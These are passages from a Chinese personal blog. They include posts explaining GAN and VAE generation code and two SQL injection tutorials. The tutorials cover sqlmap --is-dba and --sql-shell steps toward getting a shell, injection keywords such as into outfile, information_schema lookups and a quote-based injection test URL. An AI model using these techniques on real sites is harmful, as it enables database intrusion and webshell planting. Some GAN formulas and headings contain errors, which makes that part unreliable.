计算生成样本的损失</span></span><br><span class="line">        <span class="comment"># 生成模型根据随机输入生成fake_images</span></span><br><span class="line">        z = torch.randn(batch_size, latent_size)</span><br><span class="line">        fake_images = G(z) </span><br><span class="line">        outputs = D(fake_images)</span><br><span class="line">        d_loss_fake = criterion(outputs, fake_labels)</span><br><span class="line">        fake_score = outputs</span><br><span class="line">        <span class="comment"># 计算判别网络部分的总损失</span></span><br><span class="line">        d_loss = d_loss_real + d_loss_fake</span><br><span class="line">        <span class="comment"># 对判别模型损失进行反向传播和参数优化</span></span><br><span class="line">        d_optimizer.zero_grad()</span><br><span class="line">    		g_optimizer.zero_grad()</span><br><span class="line">        d_loss.backward()</span><br><span class="line">        d_optimizer.step()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ================================================================== #</span></span><br><span class="line">        <span class="comment">#                       训练生成模型                       </span></span><br><span class="line">        <span class="comment"># ================================================================== #</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 生成模型根据随机输入生成fake_images,然后判别模型进行判别</span></span><br><span class="line">        z = torch.randn(batch_size, latent_size)</span><br><span class="line">        fake_images = G(z)</span><br><span class="line">        outputs = D(fake_images)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 大致含义就是在训练初期，生成模型G还很菜，判别模型会拒绝高置信度的样本，因为这些样本与训练数据不同。</span></span><br><span class="line">        <span class="comment"># 这样log(1-D(G(z)))就近乎饱和，梯度计算得到的值很小，不利于反向传播和训练。</span></span><br><span class="line">        <span class="comment"># 换一种思路，通过计算最大化log(D(G(z))，就能够在训练初期提供较大的梯度值，利于快速收敛</span></span><br><span class="line">        g_loss = criterion(outputs, real_labels)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 反向传播和优化</span></span><br><span class="line">        reset_grad()</span><br><span class="line">        g_loss.backward()</span><br><span class="line">        g_optimizer.step()</span><br></pre></td></tr></table></figure>
<p>​    从上面的实现过程我们可以发现一个问题：在进行判别模型训练损失函数的计算由两部分组成，而生成模型进行训练时只由一部分组成，并且该部分的交叉熵还是一种反常的使用方式，这是为什么呢？</p>
<h3 id="损失函数"><a href="#损失函数" class="headerlink" title="损失函数"></a>损失函数</h3><p>​    整体的损失函数表现形式：</p>
<p>​                                            <script type="math/tex">\min\limits_{G}\max\limits_{D}E_{x\in\ P_{data}}\ [logD(x)]+E_{x\in\ P_{G}}\ [log(1-G(D(x)))]</script></p>
<h4 id="Generator-Loss"><a href="#Generator-Loss" class="headerlink" title="Generator Loss"></a>Generator Loss</h4><p>​    对于判别器进行训练时，其目标为：</p>
<p>​                                                <script type="math/tex">\max\limits_{D}E_{x\in\ P_{data}}\ [logD(x)]+E_{x\in\ P_{G}}\ [log(G(1-D(x)))]</script></p>
<p>​    而对比交叉熵损失函数的计算公式：</p>
<p>​                                                <script type="math/tex">L = -[ylogp+(1-y)log(i-p)]</script></p>
<p>​    二者其实在表现形式形式上是完全一致的，这是因为判别器就是区分样本是否为真实的样本，是一个简单的0/1分类问题，所以形式与交叉熵一致。在另一个角度我们可以观察，当输入样本为真实的样本时，$E_{x\in\ P_{G}}\ [log(1-G(D(x)))]$为0，只剩下$E_{x\in\ P_{data}}\ [logD(x)]$，为了使其最大只能优化网络时D(x)尽可能大，即真实样本判别器给出的得分更高。当输入为生成样本时，$E_{x\in\ P_{data}}\ [logD(x)]$为0，只剩下$E_{x\in\ P_{G}}\ [log(1-G(D(x)))]$，为使其最大只能使D(x)尽可能小，即使生成样本判别器给出的分数尽可能低，使用交叉熵损失函数正好与目标相符。</p>
<p>​    因此，判别器训练相关的代码如下，其中可以看到损失函数<strong>直接使用了二进制交叉熵</strong>进行。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">criterion = nn.BCELoss()</span><br><span class="line">d_optimizer = torch.optim.Adam(D.parameters(), lr=<span class="number">0.0002</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 真实样本的损失</span></span><br><span class="line">outputs = D(images)</span><br><span class="line">d_loss_real = criterion(outputs, real_labels)</span><br><span class="line">real_score = outputs</span><br><span class="line"><span class="comment"># 生成样本的损失</span></span><br><span class="line">z = torch.randn(batch_size, latent_size)  <span class="comment"># 生成模型根据随机输入生成fake_images</span></span><br><span class="line">fake_images = G(z) </span><br><span class="line">outputs = D(fake_images)</span><br><span class="line">d_loss_fake = criterion(outputs, fake_labels)</span><br><span class="line">fake_score = outputs</span><br><span class="line"><span class="comment"># 计算判别网络部分的总损失</span></span><br><span class="line">d_loss = d_loss_real + d_loss_fake</span><br><span class="line"><span class="comment"># 对判别模型损失进行反向传播和参数优化</span></span><br><span class="line">d_optimizer.zero_grad()</span><br><span class="line">g_optimizer.zero_grad()</span><br><span class="line">d_loss.backward()</span><br><span class="line">d_optimizer.step()</span><br></pre></td></tr></table></figure>
<h4 id="Discriminator-Loss"><a href="#Discriminator-Loss" class="headerlink" title="Discriminator Loss"></a>Discriminator Loss</h4><p>​    对于生成器其训练的目标为：</p>
<p>​                                            <script type="math/tex">\min\limits_{G}\max\limits_{D}E_{x\in\ P_{data}}\ [logD(x)]+E_{x\in\ P_{G}}\ [log(1-G(D(x)))]（其中D固定）</script></p>
<p>​    对于生成器，在D固定的情况下，$E_{x\in\ P_{data}}\ [logD(x)]$为固定值，因此可以不做考虑，表达式转为：</p>
<p>​                                                <script type="math/tex">\min\limits_{G}\max\limits_{D}E_{x\in\ P_{G}}\ [log(1-G(D(x)))]（其中D固定）</script></p>
<p>​    使用该表达式作为目标函数进行参数更新存在的问题就是在训练的起始阶段，由于开始时生成样本的质量很低，因此判别器很容易给一个很低的分数，即D(x)非常小，而log(1-x)的函数在值接近0时斜率也很小，因此使用该函数作为损失函数在开始时很难进行参数更新。</p>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/GAN生成器损失函数对比.png?raw=true =100*100" style="zoom:50%;"></p>
<p>​    因此生成器采用了一种与log（1-x）的更新方向一致并且在起始时斜率更大的函数。</p>
<p>​                                            <script type="math/tex">E_{x\in P_{G}}[-logG(D(x))]</script></p>
<p>​    该损失函数在代码实现中一般还是<strong>使用反标签的二进制交叉熵损失函数来进行实现</strong>，所谓反标签即为将生成的样本标注为1进行训练（正常生成样本标签为0），涉及到该部分的代码为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">criterion = nn.BCELoss()</span><br><span class="line">g_optimizer = torch.optim.Adam(D.parameters(), lr=<span class="number">0.0002</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">real_label = torch.ones(batch_size, <span class="number">1</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成模型根据随机输入生成fake_images,然后判别模型进行判别</span></span><br><span class="line">z = torch.randn(batch_size, latent_size)</span><br><span class="line">fake_images = G(z)</span><br><span class="line">outputs = D(fake_images)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 训练生成模型，使用反标签的二进制交叉熵损失函数</span></span><br><span class="line">g_loss = criterion(outputs, real_labels)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反向传播和优化</span></span><br><span class="line">reset_grad()</span><br><span class="line">g_loss.backward()</span><br><span class="line">g_optimizer.step()</span><br></pre></td></tr></table></figure>
<h3 id="GAN与VAE对比"><a href="#GAN与VAE对比" class="headerlink" title="GAN与VAE对比"></a>GAN与VAE对比</h3><p>​    GAN和VAE都是样本生成领域非常常用的两个模型流派，那这两种模型有什么不同点呢？</p>
<blockquote>
<ol>
<li><p>VAE进行对抗样本生成时，VAE的Encoder和GAN的Generator输入同样都为图片等真实样本，但<strong>VAE的Encoder输出的中间结果为隐藏向量值</strong>，而<strong>GAN的Generator输出的中间结果为生成的图片等生成样本</strong>。</p>
</li>
<li><p><strong>最终用来生成样本的部分不同</strong>。VAE最终使用Decoder部分来进行样本生成，GAN使用Generator进行样本生成。</p>
</li>
</ol>
</blockquote>
<p>​    在实际的使用过程中还存在这下面的区别使GAN比VAE更被广泛使用：</p>
<blockquote>
<ol>
<li><p>VAE生成样本点的连续性不好。VAE进行生成采用的方式是每个像素点进行生成的，很难考虑像素点之间的联系，因此经常出现一些不连续的坏点。</p>
</li>
<li><p>要生成同样品质的样本，VAE需要更大的神经网络。</p>
</li>
</ol>
</blockquote>
<p>【参考文献】</p>
<p>李宏毅在线课程:<a href="https://www.youtube.com/watch?v=DQNNMiAP5lw&amp;list=PLJV_el3uVTsMq6JEFPW35BCiOQTsoqwNw" target="_blank" rel="noopener">https://www.youtube.com/watch?v=DQNNMiAP5lw&amp;list=PLJV_el3uVTsMq6JEFPW35BCiOQTsoqwNw</a>  </p>
<p>GAN损失函数详解:<a href="https://www.cnblogs.com/walter-xh/p/10051634.html" target="_blank" rel="noopener">https://www.cnblogs.com/walter-xh/p/10051634.html</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/12/对抗样本生成——VAE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="AnchoretY">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="AnchoretY's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/12/对抗样本生成——VAE/" itemprop="url">对抗样本生成——VAE</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-12T19:03:16+08:00">
                2020-02-12
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>​    最近由于进行一些类文本生成的任务，因此对文本生成的相关的一些经典的可用于样本生成的网络进行了研究，本系列文章主要用于对这些模型及原理与应用做总结，不涉及复杂的公式推导。</p>
<p>相关文章：</p>
<ul>
<li><a href="https://anchorety.github.io/2020/02/12/%E5%AF%B9%E6%8A%97%E6%A0%B7%E6%9C%AC%E7%94%9F%E6%88%90%E2%80%94%E2%80%94VAE/" target="_blank" rel="noopener">对抗样本生成—VAE</a></li>
<li><a href="[https://anchorety.github.io/2020/02/13/%E5%AF%B9%E6%8A%97%E6%A0%B7%E6%9C%AC%E7%94%9F%E6%88%90%E2%80%94%E2%80%94GAN/](https://anchorety.github.io/2020/02/13/对抗样本生成——GAN/">对抗样本生成—GAN</a>)</li>
<li><a href="[https://anchorety.github.io/2020/02/13/%E5%AF%B9%E6%8A%97%E6%A0%B7%E6%9C%AC%E7%94%9F%E6%88%90%E2%80%94%E2%80%94DCGAN/](https://anchorety.github.io/2020/02/13/对抗样本生成——DCGAN/">对抗样本生成—DCGAN</a>)</li>
<li><a href="">对抗样本生成—文本生成</a></li>
</ul>
<h3 id="AE-Auto-Encoder"><a href="#AE-Auto-Encoder" class="headerlink" title="AE(Auto Encoder)"></a>AE(Auto Encoder)</h3><p>​    Auto Encoder中文名自动编码机，最开始用于数据压缩任务，例如：Google曾尝试使用该技术将图片再网络上只传输使用AE压缩过的编码值，而在本地进行还原来节约流量。后来也用于样本生成任务，但是用于样本生成存在着一些不可避免的问题，因此很快被VAE所取代。Auto Encoder结构如下所示：</p>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/AE结构图.png?raw=true" alt=""></p>
<p>​    主要<strong>由Encoder和Decoder两部分组成</strong>，<strong>Encoder</strong>负责将原始的图片、文本等输入<strong>压缩</strong>成更低纬度的向量进行表示，<strong>Decoder</strong>负责将该向量表示进行<strong>复原</strong>，然后通过最小化Encoder输入与Decoder输出来进行两部分模型参数的优化。</p>
<p>​    训练完成后<strong>，训练好的Encoder部分可以输入图片等数据进行数据压缩</strong>；</p>
<p><strong>AE进行数据压缩的特点：</strong></p>
<blockquote>
<p>1.只能压缩与数据高相关度的数据</p>
<p>2.有损压缩</p>
</blockquote>
<p>​    <strong>训练好的decoder可以输入随机的向量值生成样本</strong>，下图为样本生成示意图。</p>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/AE生成样本.png?raw=true" alt=""></p>
<p><strong>AE在进行样本生成时存在的问题：</strong></p>
<blockquote>
<p>1.当输入随机向量进行样本生成时，decoder部分输入的是一个随机的向量值，而AE只能保证训练集中有的数据具有比较好的效果，但是无法保证与训练集中的数据很接近的值依旧能够准确的进行判断（不能保证不存在跳变）。</p>
<p>2.没有随心所欲的去构造向量。因为输入的向量必须由原始的样本区进行构造隐藏编码，才能进行样本生成。</p>
</blockquote>
<h3 id="VAE-Varaient-Auto-Encoder"><a href="#VAE-Varaient-Auto-Encoder" class="headerlink" title="VAE(Varaient Auto Encoder)"></a>VAE(Varaient Auto Encoder)</h3><p>​    Variational Autoencoder中文名称变分自动编码器，是Auto Encoder的进化版，主要用于解决AE中存在的无法随心所欲的去生成样本，模型存在跳变等问题。<strong>核心思想为在生成隐藏向量的过程中加入一定的限制，使模型生成的样本近似的遵从标准正态分布，这样要进行样本生成我们就可以直接向模型输入一个标准正态分布的隐向量即可。</strong>有需要完整版代码的同学可以参见我的<a href="https://github.com/AnchoretY/Webshell_Sample_Generate/blob/master/VAE%20image%20generate.ipynb" target="_blank" rel="noopener">github</a></p>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/VAE结构图.png?raw=true =100*100" style="zoom:20%;"></p>
<p>​        VAE结构如上图所示。与AE一样，VAE的主要结构依然是分为Encoder和Decoder两个主要组成部分，这两部分可以使用任意的网络结构进行实现，而其中的<strong>不同点主要在于隐向量的方式不同和因此导致生成样本所需的原料不同。</strong></p>
<p>​    VAE的使用过程中，需要在模型生成样本的准确率与生成隐向量符合正态分布的成都之间做一个权衡，因此在VAE中<strong>loss中包含两部分：均方误差、KL散度</strong>。均方误差用来衡量原始图片与生成图片之间的误差，KL散度用于表示隐含向量与标准正态分布之间的差距，其计算公式如下所示：</p>
<p>​                                                                    <script type="math/tex">DKL(P||Q) = \int_{-\infty}^{\infty} P(x)log\frac{p(x)}{q(x)}dx</script></p>
<p>​    KL散度很难进行计算，因此在VAE中使用了一种”重新参数化“技巧来解决。即VAE的encoder不再直接输出一个隐含向量，而是生成两个向量，一个代表均值，一个代表方差，然后通过这两个向量与一个标准正态分布向量去合成出一个符合标准整体分布的隐含向量。其合成计算公式为：</p>
<p>​                                                                    <script type="math/tex">z = \mu+\sigma \cdot \epsilon</script></p>
<p>​    其中，u为均值向量，$\sigma$为方差向量，$\epsilon$为标准的正态分布向量。</p>
<p>​    而VAE的代码实现也非常的简单，其核心的代码实现如下所示：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VAE</span><span class="params">(nn.Module)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, image_size=<span class="number">784</span>, h_dim=<span class="number">400</span>, z_dim=<span class="number">20</span>)</span>:</span></span><br><span class="line">        super(VAE, self).__init__()</span><br><span class="line">        self.fc1 = nn.Linear(image_size, h_dim)</span><br><span class="line">        self.fc2 = nn.Linear(h_dim, z_dim) <span class="comment"># 均值 向量</span></span><br><span class="line">        self.fc3 = nn.Linear(h_dim, z_dim) <span class="comment"># 保准方差 向量</span></span><br><span class="line">        self.fc4 = nn.Linear(z_dim, h_dim)</span><br><span class="line">        self.fc5 = nn.Linear(h_dim, image_size)</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># 编码过程</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        h = F.relu(self.fc1(x))</span><br><span class="line">        <span class="keyword">return</span> self.fc2(h), self.fc3(h)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 随机生成隐含向量</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reparameterize</span><span class="params">(self, mu, log_var)</span>:</span></span><br><span class="line">        std = torch.exp(log_var/<span class="number">2</span>)</span><br><span class="line">        eps = torch.randn_like(std)</span><br><span class="line">        <span class="keyword">return</span> mu + eps * std</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解码过程</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(self, z)</span>:</span></span><br><span class="line">        h = F.relu(self.fc4(z))</span><br><span class="line">        <span class="keyword">return</span> F.sigmoid(self.fc5(h))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 整个前向传播过程：编码-》解码</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        mu, log_var = self.encode(x)</span><br><span class="line">        z = self.reparameterize(mu, log_var)</span><br><span class="line">        x_reconst = self.decode(z)</span><br><span class="line">        <span class="keyword">return</span> x_reconst, mu, log_var</span><br></pre></td></tr></table></figure>
<p>​    在我的<a href="https://github.com/AnchoretY/Webshell_Sample_Generate/blob/master/VAE%20image%20generate.ipynb" target="_blank" rel="noopener">github</a>上还有完整的将VAE应用到手写数字生成的代码，需要的同学可以关注一下。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​    VAE与AE的对比：</p>
<blockquote>
<p><strong>1.隐藏向量的生成方式不同。</strong></p>
<p>​    AE的Encoder直接生成隐藏向量，而VAE的Encoder是生成均值向量和方差向量再加上随机生成的正态分布向量来进行合成隐藏向量。</p>
<p><strong>2.样本生成能力不同。</strong>这也是AE在对抗样本生成领域中很少被使用的主要原因</p>
<p>​    AE要进行样本生成只能使用已有样本生成的隐含向量作为输入输入到Decoder中，由于已有样本有限，因此能够生成的对抗样本数量有限。</p>
<p>​    VAE可以直接使用符合正态分布的任意向量直接输入到Decoder中进行样本生成，能够任意进行样本生成。</p>
</blockquote>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/20/sql注入——通过sqlmap进行getshell常见的问题/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="AnchoretY">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="AnchoretY's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/20/sql注入——通过sqlmap进行getshell常见的问题/" itemprop="url">sql注入——通过sqlmap进行getshell常见的问题</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-20T10:22:24+08:00">
                2020-01-20
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>​    在上一篇文章中，我们提到了要使用sqlmap中自带的os-shell命令直接getshell要有下面四个先条件：</p>
<blockquote>
<p>1.当前注入点为root权限</p>
<p>2.已知网站绝对路径</p>
<p>3.php转义功能关闭</p>
<p>4.secure_file_priv= 值为空</p>
</blockquote>
<p>在本文中将针对在实际环境中使用sqlmap进行getshell如何获取这些先决条件来进行详细介绍。</p>
<h3 id="1-确认注入点权限"><a href="#1-确认注入点权限" class="headerlink" title="1.确认注入点权限"></a>1.确认注入点权限</h3><p>​    首先要确认注入点权限是否为root权限，可以直接使用sqlmap自带的测试命令is-dba</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u 网址 --is-dba</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/产看当前注入点是否为root权限结果.png?raw=true" alt=""></p>
<h3 id="2-网站的绝对路径"><a href="#2-网站的绝对路径" class="headerlink" title="2.网站的绝对路径"></a>2.网站的绝对路径</h3><p>​    获取网站的绝对路径在可以先进入sql-shell:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u 网址 --sql-shell</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/进入sql-shell.png?raw=true" alt=""></p>
<p>​    然后再在sql-shell中直接使用sql命令读取数据库文件存放路径：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql-shell&gt; select @@datadir;</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/sql-shell获取绝对路径结果.png?raw=true" alt=""></p>
<p>然后通过数据库文件的位置进行网站所在的绝对路径进行猜测。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/18/sql注入——手工注入/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="AnchoretY">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="AnchoretY's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/18/sql注入——手工注入/" itemprop="url">sql注入——手工注入</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-18T09:43:39+08:00">
                2020-01-18
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>​    本文主要对手工方式sql注入进行介绍，包括sql注入的介绍和分类、sql注入中常用的关键字与敏感函数、经典的手工注入、利用sql注入进行文件的写入与读取等几部分。</p>
<p>​    后续的sql注入系列文章还将对使用sqlmap进行sql注入以及进行sql注入过程常见的一些关键问题做阐述，可以参见后面的文章：</p>
<ul>
<li><a href="">sql注入——sqlmap6步注入法</a></li>
<li><a href="">sql注入——通过sqlmap进行getshell常见的问题</a></li>
</ul>
<h3 id="sql注入介绍与分类"><a href="#sql注入介绍与分类" class="headerlink" title="sql注入介绍与分类"></a>sql注入介绍与分类</h3><p>​    </p>
<pre class="mermaid">graph LR
A(sql注入)  --> B(普通注入)
A --> C(圆角长方形)
C-->D(布尔型盲注)
C-->E(延时盲注)</pre>

<p>​    常见的sql注入主要分从注入结果的展现形式上分为普通注入和盲注两大类。最简单也是最常见的就是普通话的sql注入了，这种注入方式进行注入有直观展示的结果进行结果展示，一般可以直接使用union语句进行联合查询获取信息上传文件等操作，后续在<a href="#经典手工注入流程">经典手工注入流程</a>中讲述的就是使用普通注入进行sql注入。</p>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/一般mysql.png?raw=true" alt=""></p>
<p>​    另外一大类sql注入就是盲注，这种sql注入方式一般用于页面并没有对sql注入的查询结果直接进行返回，只能通过返回的一些其他信息判断注入的片段是否正确进行了执行。其中根据页面返回的布尔值(页面是否正确返回)进行sql注入称为<strong>布尔型盲注</strong>，根据页面返回时间的差异确定注入是否成功的sql注入称为<strong>延时盲注</strong>。下面是一个最常用延时注入的例子：</p>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/延时注入.png?raw=true" alt=""></p>
<p>在上面的例子中，再过个浏览器控制器的控制台中，可以看到该请求存在着10s左右的等待时间，也即是说明我们前面的进行拼遭的sql注入语句正确的进行了执行，因此可以判断该部分是一个可以进行利用的注入点。本文重点介绍一般的注入，关于盲注的具体使用将在后续的文章中进行介绍。</p>
<h3 id="2-sql-注入中常用的关键字和系统表"><a href="#2-sql-注入中常用的关键字和系统表" class="headerlink" title="2.sql 注入中常用的关键字和系统表"></a>2.sql 注入中常用的关键字和系统表</h3><h4 id="sql注入中常用到的sql关键字"><a href="#sql注入中常用到的sql关键字" class="headerlink" title="sql注入中常用到的sql关键字"></a>sql注入中常用到的sql关键字</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">表达式</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">union</td>
<td style="text-align:center">将查询结果进行联合输出，追加在列尾</td>
</tr>
<tr>
<td style="text-align:center">union all</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">load</td>
<td style="text-align:center">文件读取</td>
</tr>
<tr>
<td style="text-align:center">into outfile</td>
<td style="text-align:center">文件写入</td>
</tr>
<tr>
<td style="text-align:center">@@datadir</td>
<td style="text-align:center">数据库文件存放路径</td>
</tr>
<tr>
<td style="text-align:center">user()</td>
<td style="text-align:center">当前用户</td>
</tr>
<tr>
<td style="text-align:center">version()</td>
<td style="text-align:center">数据库版本</td>
</tr>
<tr>
<td style="text-align:center">database()</td>
<td style="text-align:center">数据库名称</td>
</tr>
<tr>
<td style="text-align:center">sleep(n)</td>
<td style="text-align:center">延时执行n秒</td>
</tr>
</tbody>
</table>
</div>
<blockquote>
<p>@@表示系统变量</p>
</blockquote>
<h4 id="mysql中常用的系统表"><a href="#mysql中常用的系统表" class="headerlink" title="mysql中常用的系统表"></a>mysql中常用的系统表</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">数据库</th>
<th style="text-align:center">表名</th>
<th style="text-align:center">描述</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">information_schema</td>
<td style="text-align:center">tables</td>
<td style="text-align:center">mysql中存储的全部表名，使用table_schema指定数据库名</td>
<td>select table_schema.tables where table_scheama=数据库名</td>
</tr>
<tr>
<td style="text-align:center">information_schema</td>
<td style="text-align:center">columns</td>
<td style="text-align:center">mysql中存储全部其他表的字段名，使用table_name指定表名</td>
<td>select information_schema.columns where table_name=表名</td>
</tr>
</tbody>
</table>
</div>
<blockquote>
<p>Information_schema是mysql中自带的一个数据库，这个数据库中包含了其他数据的各种信息，包括数据库中的表名、权限、字段名等。</p>
</blockquote>
<h3 id="3-经典手工注入流程"><a href="#3-经典手工注入流程" class="headerlink" title="3.经典手工注入流程"></a>3.经典手工注入流程<div id="mark"></div></h3><h4 id="1-注入点测试"><a href="#1-注入点测试" class="headerlink" title="1.注入点测试"></a>1.注入点测试</h4><p>​    注入点测试主要分为<strong>是否存在sql注入检测</strong>与<strong>sql注入类型检测</strong>两个部分。<strong>要检测时候否存在sql注入</strong>只需要在要进行检测的参数后面加单引号，看是会因’个数不匹配而报错（这里的报错不一定是真的报错，可能只是页面不在正常显示之前的内容也可以看做报错的一种）。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/abc.php?id=1'</span><br></pre></td></tr></table></figure>
<p>​    sql注入的注入点的类型主要分为数字型注入点和字符型注入点两种，分别对应着要进行sql注入的参数值在数据库中存储的类型是字符型还是数字型，直接影响到后面进行后续的注入的一些细节。</p>
